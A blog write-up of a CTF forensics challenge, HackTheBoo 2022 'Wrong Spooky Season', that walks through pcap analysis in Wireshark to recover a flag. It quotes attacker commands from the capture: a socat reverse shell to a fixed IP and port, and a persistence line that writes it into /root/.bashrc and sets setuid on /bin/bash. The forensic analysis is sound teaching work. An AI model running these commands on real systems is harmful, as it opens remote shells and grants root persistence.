---
layout: post
title:  "HTB HackTheBoo 2022 - (Forensics) Wrong Spooky Season"
date:   2022-10-27 18:00:00 +0300
categories: HackTheBoo_2022 CTF forensics network_forensics
summary: Writeup for the Wrong Spooky Season challenge (Forensics1/5) from HackTheBoo 2022. This challenge involved some simple analysis of a pcap file.
---


'Wrong Spooky Season' was a forensics challenge (day1 out of 5) from HackTheBox's HackTheBoo CTF.  
The challenge involved some simple analysis of a pcap file.

### Network analysis

For this challenge we got a pcap file. 

![Opening the pcap file]({{site.baseurl}}/assets/img/HackTheBoo_2022/wrong_spooky_season/wireshark1.png){: .center-image}

We open the file with Wireshark and we see some http traffic.  

As a result, we'll start with filtering the http traffic (use 'http' as a filter) and analyzing that.

![Analyzing HTTP traffic]({{site.baseurl}}/assets/img/HackTheBoo_2022/wrong_spooky_season/wireshark2.png){: .center-image}

Near the end of the capture, we can see requests being made to an endpoint (/e4d1c32a56ca15b3.jsp) that has a *cmd* parameter.  
Here, the *cmd* parameter is being used for transmitting bash commands.  
In the last GET request that we can see in the capture, we see the attacker using socat to open a reverse shell.

{% highlight bash %}
socat TCP:192.168.1.180:1337 EXEC:bash
{% endhighlight %}

The attacker did not use encryption for their shell, so we can look at their activity by following one of the TCP streams that are opened after that GET request is processed.

![Analyzing TCP stream]({{site.baseurl}}/assets/img/HackTheBoo_2022/wrong_spooky_season/wireshark3.png){: .center-image}

Here we can see the attacker interacting with the target system.  
The second last command that was ran is used by the attacker to establish persistence on the system by adding their reverse shell command to /root/.bashrc

{% highlight bash %}
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
{% endhighlight %}

This is where we can also see a string being echoed to the terminal.  

### Getting the flag

That string is base64-encoded and then reversed.  
This can be quite obvious even without seeing the rest of the command because of the "==" at the beginning of the string (you would expect two equal signs at the end of a base64-encoded string).

We use CyberChef to reverse the string and then base64-decode it.

![Getting the flag]({{site.baseurl}}/assets/img/HackTheBoo_2022/wrong_spooky_season/flag.png){: .center-image}

And we got our flag

### Other forensics challenges from this CTF

This CTF released a challenge in each of its 5 categories every day.  
I have writeups for all the forensics challenges. Here are some links to them:
- Day 1 - Wrong Spooky Season (you are here)
- Day 2 - [Trick or Breach](/HTB-HackTheBoo-2022-Forensics2-Trick-of-Breach)
- Day 3 - [Halloween Invitation](/HTB-HackTheBoo-2022-Forensics3-Halloween-Invitation)
- Day 4 - [POOF](/HTB-HackTheBoo-2022-Forensics4-POOF)
- Day 5 - [Downgrade](/HTB-HackTheBoo-2022-Forensics5-Downgrade)
